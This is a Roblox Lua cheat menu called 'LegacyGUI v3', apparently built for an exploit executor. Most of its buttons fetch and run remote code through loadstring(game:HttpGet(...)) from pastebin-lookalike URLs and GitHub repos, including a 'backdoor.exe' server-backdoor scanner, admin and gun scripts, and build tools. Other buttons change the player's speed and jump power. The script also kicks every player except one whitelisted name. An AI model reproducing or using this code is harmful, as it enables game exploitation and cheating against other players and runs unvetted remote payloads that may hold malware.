-- LegacyGUI v3

-- Instances:

local LegacyGUI = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Panel = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Frame = Instance.new("Frame")
local LegacyGUI_2 = Instance.new("TextLabel")
local Version = Instance.new("TextLabel")
local L_Icon = Instance.new("ImageLabel")
local UICorner_3 = Instance.new("UICorner")
local Neptunian = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Admin = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Gun = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Backdoor = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local BTools = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local Pastebin = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local JumpPower = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local Car = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local Speed = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local WelcomeText = Instance.new("TextLabel")

--Properties:

LegacyGUI.Name = "LegacyGUI"
LegacyGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
LegacyGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = LegacyGUI
Main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Main.Position = UDim2.new(0.0261780098, 0, 0.609336615, 0)
Main.Size = UDim2.new(0, 611, 0, 299)

UICorner.Parent = Main

Panel.Name = "Panel"
Panel.Parent = Main
Panel.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Panel.Size = UDim2.new(0, 611, 0, 47)

UICorner_2.Parent = Panel

Frame.Parent = Panel
Frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, 0.787234068, 0)
Frame.Size = UDim2.new(0, 611, 0, 10)

LegacyGUI_2.Name = "LegacyGUI"
LegacyGUI_2.Parent = Panel
LegacyGUI_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LegacyGUI_2.BackgroundTransparency = 1.000
LegacyGUI_2.Position = UDim2.new(0.0945378169, 0, 0.148936167, 0)
LegacyGUI_2.Size = UDim2.new(0, 105, 0, 30)
LegacyGUI_2.Font = Enum.Font.SourceSansBold
LegacyGUI_2.Text = "LegacyGUI"
LegacyGUI_2.TextColor3 = Color3.fromRGB(255, 255, 255)
LegacyGUI_2.TextScaled = true
LegacyGUI_2.TextSize = 14.000
LegacyGUI_2.TextWrapped = true

Version.Name = "Version"
Version.Parent = Panel
Version.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Version.BackgroundTransparency = 1.000
Version.Position = UDim2.new(0.266026229, 0, 0.148936167, 0)
Version.Size = UDim2.new(0, 23, 0, 17)
Version.Font = Enum.Font.SourceSansBold
Version.Text = "v3"
Version.TextColor3 = Color3.fromRGB(255, 85, 0)
Version.TextScaled = true
Version.TextSize = 14.000
Version.TextWrapped = true

L_Icon.Name = "L_Icon"
L_Icon.Parent = Panel
L_Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
L_Icon.BackgroundTransparency = 1.000
L_Icon.Position = UDim2.new(0.0168067235, 0, 0.148936167, 0)
L_Icon.Size = UDim2.new(0, 31, 0, 30)
L_Icon.Image = "http://www.roblox.com/asset/?id=6416941921"

UICorner_3.Parent = L_Icon

Neptunian.Name = "Neptunian"
Neptunian.Parent = Main
Neptunian.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Neptunian.Position = UDim2.new(0.0168067235, 0, 0.202205881, 0)
Neptunian.Size = UDim2.new(0, 142, 0, 37)
Neptunian.Font = Enum.Font.SourceSansBold
Neptunian.Text = "Neptunian V"
Neptunian.TextColor3 = Color3.fromRGB(255, 255, 255)
Neptunian.TextSize = 25.000
Neptunian.TextWrapped = true
Neptunian.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://pastebinp.com/raw/t0Mkc33N'),true))()
end)

UICorner_4.CornerRadius = UDim.new(0, 6)
UICorner_4.Parent = Neptunian

Admin.Name = "Admin"
Admin.Parent = Main
Admin.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Admin.Position = UDim2.new(0.38308531, 0, 0.202205881, 0)
Admin.Size = UDim2.new(0, 142, 0, 37)
Admin.Font = Enum.Font.SourceSansBold
Admin.Text = "Reviz Admin"
Admin.TextColor3 = Color3.fromRGB(255, 255, 255)
Admin.TextSize = 25.000
Admin.TextWrapped = true
Admin.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebinp.com/raw/66ht0mPq',true))()
end)

UICorner_5.CornerRadius = UDim.new(0, 6)
UICorner_5.Parent = Admin

Gun.Name = "Gun"
Gun.Parent = Main
Gun.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Gun.Position = UDim2.new(0.738240778, 0, 0.202205881, 0)
Gun.Size = UDim2.new(0, 142, 0, 37)
Gun.Font = Enum.Font.SourceSansBold
Gun.Text = "Gun"
Gun.TextColor3 = Color3.fromRGB(255, 255, 255)
Gun.TextSize = 25.000
Gun.TextWrapped = true
Gun.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebinp.com/raw/81hUMXjp',true))()
end)

UICorner_6.CornerRadius = UDim.new(0, 6)
UICorner_6.Parent = Gun

Backdoor.Name = "Backdoor"
Backdoor.Parent = Main
Backdoor.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Backdoor.Position = UDim2.new(0.38308534, 0, 0.399530292, 0)
Backdoor.Size = UDim2.new(0, 142, 0, 37)
Backdoor.Font = Enum.Font.SourceSansBold
Backdoor.Text = "backdoor.exe"
Backdoor.TextColor3 = Color3.fromRGB(255, 255, 255)
Backdoor.TextSize = 25.000
Backdoor.TextWrapped = true
Backdoor.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua',true))()
end)

UICorner_7.CornerRadius = UDim.new(0, 6)
UICorner_7.Parent = Backdoor

BTools.Name = "BTools"
BTools.Parent = Main
BTools.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
BTools.Position = UDim2.new(0.738240838, 0, 0.399530292, 0)
BTools.Size = UDim2.new(0, 142, 0, 37)
BTools.Font = Enum.Font.SourceSansBold
BTools.Text = "FE BTools"
BTools.TextColor3 = Color3.fromRGB(255, 255, 255)
BTools.TextSize = 25.000
BTools.TextWrapped = true
BTools.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebinp.com/raw/kkcL96Gz',true))()
end)

UICorner_8.CornerRadius = UDim.new(0, 6)
UICorner_8.Parent = BTools

Pastebin.Name = "Pastebin"
Pastebin.Parent = Main
Pastebin.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Pastebin.Position = UDim2.new(0.736604154, 0, 0.596854687, 0)
Pastebin.Size = UDim2.new(0, 142, 0, 37)
Pastebin.Font = Enum.Font.SourceSansBold
Pastebin.Text = "Pastebin"
Pastebin.TextColor3 = Color3.fromRGB(255, 255, 255)
Pastebin.TextSize = 25.000
Pastebin.TextWrapped = true
Pastebin.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebinp.com/raw/00nQExWQ',true))()
end)

UICorner_9.CornerRadius = UDim.new(0, 6)
UICorner_9.Parent = Pastebin

JumpPower.Name = "JumpPower"
JumpPower.Parent = Main
JumpPower.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
JumpPower.Position = UDim2.new(0.381448686, 0, 0.596854687, 0)
JumpPower.Size = UDim2.new(0, 142, 0, 37)
JumpPower.Font = Enum.Font.SourceSansBold
JumpPower.Text = "JumpPower"
JumpPower.TextColor3 = Color3.fromRGB(255, 255, 255)
JumpPower.TextSize = 25.000
JumpPower.TextWrapped = true
JumpPower.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100
end)

UICorner_10.CornerRadius = UDim.new(0, 6)
UICorner_10.Parent = JumpPower

Car.Name = "Car"
Car.Parent = Main
Car.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Car.Position = UDim2.new(0.0164732337, 0, 0.399530292, 0)
Car.Size = UDim2.new(0, 142, 0, 37)
Car.Font = Enum.Font.SourceSansBold
Car.Text = "Car"
Car.TextColor3 = Color3.fromRGB(255, 255, 255)
Car.TextSize = 25.000
Car.TextWrapped = true
Car.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/MonkoTubeYT/carscript/master/!carscript.lua',true))()
end)

UICorner_11.CornerRadius = UDim.new(0, 6)
UICorner_11.Parent = Car

Speed.Name = "Speed"
Speed.Parent = Main
Speed.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Speed.Position = UDim2.new(0.0164732337, 0, 0.596854687, 0)
Speed.Size = UDim2.new(0, 142, 0, 37)
Speed.Font = Enum.Font.SourceSansBold
Speed.Text = "Speed"
Speed.TextColor3 = Color3.fromRGB(255, 255, 255)
Speed.TextSize = 25.000
Speed.TextWrapped = true
Speed.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
end)

UICorner_12.CornerRadius = UDim.new(0, 6)
UICorner_12.Parent = Speed

WelcomeText.Name = "Welcome Text"
WelcomeText.Parent = Main
WelcomeText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WelcomeText.BackgroundTransparency = 1.000
WelcomeText.Position = UDim2.new(0.0163666122, 0, 0.779264212, 0)
WelcomeText.Size = UDim2.new(0, 583, 0, 50)
WelcomeText.Font = Enum.Font.Cartoon
WelcomeText.Text = "null"
WelcomeText.TextColor3 = Color3.fromRGB(255, 255, 255)
WelcomeText.TextScaled = true
WelcomeText.TextSize = 14.000
WelcomeText.TextWrapped = true

-- Scripts:

local function USXHBRG_fake_script() -- WelcomeText.Welcome Text LocalScript 
	local script = Instance.new('LocalScript', WelcomeText)

	local player = game.Players.LocalPlayer
	
	if player then
		script.Parent.Text = "Welcome to LegacyGUI "..player.Name.."!"
	end
end
coroutine.wrap(USXHBRG_fake_script)()
local function XPCXU_fake_script() -- Main.Draggable 
	local script = Instance.new('LocalScript', Main)

	frame = script.Parent
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(XPCXU_fake_script)()
local function ACPSXOP_fake_script() -- Main.Send Notification 
	local script = Instance.new('Script', Main)

	local function callback(Text)
		if Text == "Button1 text" then
			print ("Answer")
		elseif Text == ("Button2 text") then
			print ("Answer2")
		end
	end
	
	local NotificationBindable = Instance.new("BindableFunction")
	NotificationBindable.OnInvoke = callback
	--
	game.StarterGui:SetCore("SendNotification",  {
		Title = "Thanks for buying!";
		Text = "Thanks for buying LegacyGUI";
		Icon = "http://www.roblox.com/asset/?id=6416941921";
		Duration = 12;
		Button1 = "ok";
		Callback = NotificationBindable;
	})
end
coroutine.wrap(ACPSXOP_fake_script)()
local function QPEFZ_fake_script() -- Main.Bruh 
	local script = Instance.new('LocalScript', Main)

	local player = game.Players.LocalPlayer
	
	if player.DisplayName == "Legacy_Scripter" then
		print("Whitelisted!")
	else
		player:Kick('Not whitelisted!')
	end
end
coroutine.wrap(QPEFZ_fake_script)()
